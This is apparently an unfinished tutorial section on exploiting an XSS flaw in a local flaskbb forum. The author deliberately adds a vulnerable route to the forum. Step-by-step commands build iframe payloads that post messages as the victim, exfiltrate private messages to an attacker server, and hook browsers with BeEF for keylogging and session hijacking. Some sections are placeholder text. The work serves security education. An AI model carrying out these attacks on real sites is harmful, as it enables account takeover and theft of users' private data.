IV. Exploitations
=================

What is idea behind exploiting a XSS vulnerability ?
----------------------------------------------------

XSS exploitations requires careful planning of the attack we want to run against the target. Ultimately, it will allow us to :

    perform any action the target can perform in this domain
    access any information the target has access to in this domain

Instead of an "alert(1)", we will actually ship a specifically crafted javascript payload, which will run in the background, silently executing all the steps we want to execute on behalf of the user. It requires prior analysis of the website or application.

Let's go straight to examples.

Given a vulnerable application, we will try to develop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
First we will setup a vulnerable application, then propose 3 different attacks :

    - execute actions on behalf of user
    - steal private information
    - Man In the Browser attack : interactive session hijacking, keylogger, browser exploits...
        
A. Setup the vulnerable application : a forum.
----------------------------------------------
In an attempt to be as realistic as possible, I decided to start with a real full-fledged application. I choose flaskbb[0], a forum developed in python using flask.

First step is to add our extra XSS "feature". I kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :

    localhost:8080/xss/YWxlcnQoMSkK

![Demo : alert(1)](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/alert.png)

The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules[Appendix0TODO](https://github.com/centime/xss-paper/blob/master/6.Appendix.md), and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[Appendix1TODO](https://github.com/centime/xss-paper/blob/master/6.Appendix.md)

Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !

B. Post a message on behalf of a user.
---------------------------------------
First, let's introduce two tools that we will use : 

    burp[2] : An HTTP proxy, often used in web penetration tests because it is awesome. We will just scratch the surface here, using it to log our http traffic.
              Basically, it will allow us to record all our HTTP traffic, and export logs of it.
    xssless[3] : A python script to generate XSS payloads from burp's logs. Best part is that it takes care of crsf tokens (nonces) !

The procedure is as follow : 

    1) log in with a user we control.
    2) start burp's interception
    3) post a new message.
    4) stop burp's interception and export logs
    5) list the csrf tokens
    6) run xssless
    7) modify the payload with our malicious message
    8) craft our exploit
    9) expose targeted users to our exploit

Steps 1-4 I won't describe, burp is widely documented across the web.

Step 5 : In the requests that burp intercepted, we look for any parameter that might be a csrf token. It's usually obvious, and it certainly is here.

    #Create a file with the identifier of the csrf token(s)
    echo 'csrf_token' > params

Step 6 : Xssless is nice because we don't even have to have a deep look into what's going on. We could probably skip some requests, but we know that repoducing step by step what we recorded will work. We just need to tell it which parameters to adapt dynamically.

    #Run xssless, and feed him the list of crsf token(s) as well as the logs from burp.
    xssless -s -p params ../burp-logs/post-topic.burp > post-topic.js

You can see the resulting code here[Appendix2TODO](https://github.com/centime/xss-paper/blob/master/payloads/post-topic.js).

Step 7 : Now you can edit the payload to replace the title or content of the post you want. 

    #As we can see, in this example the post will have "I think" for title, and "I've been hacked." for content.
    grep content post-topic.js
        [...] &title=I+think&content=I%27ve+been+hacked+%3A%28 [...]

Just don't forget to url-encode your texts.

Step 8 : At this point we should run our payload through a js minifyer[4TODO]. Here we won't, for the sake of simplicity. To have a working exploit we need however the base64 of our payload, and to remove the script tag :
    
    #Well, remove the script tags and base64 the rest...
    grep -v script post-topic.js | base64 -w0 > post-topic.b64

Step 9 : Now, all we have to do is put it somewhere on internet, inside an iFrame pointing to the vulnerability, and bring authenticated users of our forum to visit it.

    #Insert the payload at the end of the vulnerable URL, and put it all in the src attribute of an iFrame
    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html

    #Start an instance of our malicious HTTP server, on localhost:1337
    cd malicious-website && python3 -m http.server 1337

Step 10 : profit !  
![Exploit : Post a message on behalf of a victim](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/post-topic.png)
    
    1. Target gets the exploit delivered
    2. Target follows the iFrame
    3. Target executes the script, sending requests...
       ...and ultimately sends the final POST request, which creates the new post.

C. Read a user's private conversations.
-----------------------------------------

So, here I hand-crafted an exploit[Appendix3TODO](https://github.com/centime/xss-paper/blob/master/payloads/read-private.js) 
. This is classic javascript programming, so I won't explain in detail, but here is what it does when executed :
    
    -request user/messages/inbox
    -parse the response to get the private messages received. For each, we can extract title, author, and a link to the content
    -request each of thoses new links
    -parse the responses to get the content of each message
    -wrap it all in a serialized json, urlencode, and ship it in a GET request to our malicious website.

Of course, like most exploits, this code isn't a piece of art. But hey, it works. Now, let's package it, as we did for the previous one :

    #Base64 encode the JS
    base64 -w0 read-private.js > read-private.b64

    #Put everything together in an iFrame
    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html

    #Start our malicious website
    cd malicious-website && python3 -m http.server 1337

When an authenticated user (test2 in my case) visits localhost:1337/read-private.html, our malicious server quicly receives a GET containing all the stolen messages :

![Exploit : reading private messages](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/read-private.png)

    1. Target gets the exploit delivered
    2. Target follows the iFrame
    3. Target executes the script, sending requests to fetch the messages... (not all visible here)
       ...and ultimately sends the GET request containing all the data, back to our malicious website
    4. Attacker receives the data (url-encoded)
    5. Attacker decodes the data

D. Man In the Browser
---------------------

###BeEF
    
    Browser Exploitation Framework[6]
    blablabla
    blablabla
    blablabla
    blablabla TODO !

    alternative : xenotix[7]
    
Add a BeEF hook to our page :

    base64 -w0 add-hook.js > add-hook.b64

    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/add-hook.b64)'></iframe>" > malicious-website/add-hook.html
    cd malicious-website && python3 -m http.server 1337

Start the BeEF server, connect to it using the web interface, and wait for a visitor..

![BeEF : ui](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-1.png)



###Key logger
    
    Start the Man In the Browser attack to keep the target hooked when it follows links on the current domain.

![Demo : MItB](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-MItB.png)

    All actions and inputs are recorded under the "logs" panel.

![BeEF : keylogger](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-keylogger.png)

TODO : logout if needed.
    

###Interactive session hijacking

        Beef > target > use as proxy

![BeEF : use as proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-useproxy.png)

        chromium --temp-profile --proxy-server=localhost:6789

![BeEF : proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-proxy.png)

    Unfortunately, I couldn't manage to get it to work. The requests stay blocked somewhere between BeEF and the zombie... 


###More
    Metasploit : AutoPWN !
    Social Engineering
    Network
    Botnet
    ...
    TODO
    TODO screenshots
    


Summary
-------
    Specific payloads
        precise, effective
        single use
        discreet

    Exploitation framework
        powerfull (scary)
        versatile
        fingerprint




Refs
----
    [0] https://github.com/sh4nks/flaskbb
    [2] http://portswigger.net/burp/
    [3] https://github.com/mandatoryprogrammer/xssless
    [6] http://beefproject.com/
    [7] http://xenotix.in/


